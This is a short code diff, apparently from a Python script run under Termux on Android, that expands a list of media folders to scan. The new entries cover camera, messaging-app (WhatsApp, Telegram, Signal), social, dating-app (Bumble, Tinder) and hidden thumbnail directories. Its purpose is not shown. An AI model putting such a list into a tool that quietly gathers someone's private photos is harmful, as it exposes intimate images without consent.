@@ -25,13 +25,116 @@ CONFIG = {
 
 # ========== DIRETÓRIOS DO TERMUX ==========
 MEDIA_DIRS = [
+    # DCIM (câmera principal)
     "/sdcard/DCIM/Camera",
     "/sdcard/DCIM/Screenshots",
+    "/sdcard/DCIM/100ANDRO",
+    "/sdcard/DCIM/100MEDIA",
+    "/sdcard/DCIM/Restored",
+    
+    # Pictures (imagens em geral)
     "/sdcard/Pictures",
+    "/sdcard/Pictures/Screenshots",
+    "/sdcard/Pictures/Instagram",
+    "/sdcard/Pictures/WhatsApp",
+    "/sdcard/Pictures/Telegram",
+    "/sdcard/Pictures/Facebook",
+    "/sdcard/Pictures/Twitter",
+    "/sdcard/Pictures/Reddit",
+    "/sdcard/Pictures/Pinterest",
+    "/sdcard/Pictures/Snapchat",
+    "/sdcard/Pictures/TikTok",
+    
+    # Download
     "/sdcard/Download",
+    
+    # Movies/Videos
     "/sdcard/Movies",
+    "/sdcard/Movies/Instagram",
+    "/sdcard/Movies/WhatsApp",
+    
+    # WhatsApp específico
+    "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images",
+    "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video",
+    "/sdcard/WhatsApp/Media/WhatsApp Images",
+    "/sdcard/WhatsApp/Media/WhatsApp Video",
+    
+    # Telegram
+    "/sdcard/Telegram/Telegram Images",
+    "/sdcard/Telegram/Telegram Video",
+    "/sdcard/Android/media/org.telegram.messenger/Telegram/Telegram Images",
+    
+    # Instagram
+    "/sdcard/Instagram",
+    "/sdcard/Pictures/Instagram",
+    
+    # Snapchat
+    "/sdcard/Snapchat",
+    
+    # TikTok
+    "/sdcard/TikTok",
+    
+    # Facebook
+    "/sdcard/Facebook",
+    
+    # Messenger
+    "/sdcard/Pictures/Messenger",
+    
+    # Outros apps populares
+    "/sdcard/Pictures/Signal",
+    "/sdcard/Pictures/Discord",
+    "/sdcard/Pictures/Kik",
+    "/sdcard/Pictures/LINE",
+    "/sdcard/Pictures/Viber",
+    "/sdcard/Pictures/WeChat",
+    
+    # Bumble/Tinder/Apps de namoro
+    "/sdcard/Pictures/Bumble",
+    "/sdcard/Pictures/Tinder",
+    
+    # Editores de foto
+    "/sdcard/Pictures/PicsArt",
+    "/sdcard/Pictures/Lightroom",
+    "/sdcard/Pictures/Snapseed",
+    "/sdcard/Pictures/VSCO",
+    "/sdcard/Pictures/Remini",
+    
+    # Apps de câmera alternativos
+    "/sdcard/DCIM/OpenCamera",
+    "/sdcard/DCIM/FootejCamera",
+    "/sdcard/DCIM/Camera360",
+    
+    # Storage alternativo (emulated)
     "/storage/emulated/0/DCIM/Camera",
-    "/data/data/com.termux/files/home/storage/dcim/Camera"
+    "/storage/emulated/0/DCIM/Screenshots",
+    "/storage/emulated/0/Pictures",
+    "/storage/emulated/0/Download",
+    "/storage/emulated/0/Movies",
+    "/storage/emulated/0/WhatsApp",
+    "/storage/emulated/0/Telegram",
+    
+    # Termux
+    "/data/data/com.termux/files/home/storage/dcim/Camera",
+    "/data/data/com.termux/files/home/storage/pictures",
+    "/data/data/com.termux/files/home/storage/downloads",
+    
+    # Armazenamento externo (se disponível)
+    "/storage/XXXX-XXXX/DCIM/Camera",  # Substitua XXXX pelo ID do SD card
+    "/storage/extSdCard/DCIM/Camera",
+    "/storage/sdcard1/DCIM/Camera",
+    "/mnt/media_rw/XXXX-XXXX/DCIM/Camera",
+    
+    # Backups e restaurações
+    "/sdcard/DCIM/.thumbnails",
+    "/sdcard/DCIM/.Restored",
+    "/sdcard/restore",
+    
+    # Cromecast/Streaming
+    "/sdcard/Pictures/Chromecast",
+    
+    # Screenshots adicionais
+    "/sdcard/DCIM/ScreenCapture",
+    "/sdcard/Screenshots",
 ]
 
 # ========== EXTENSÕES DE MÍDIA ==========
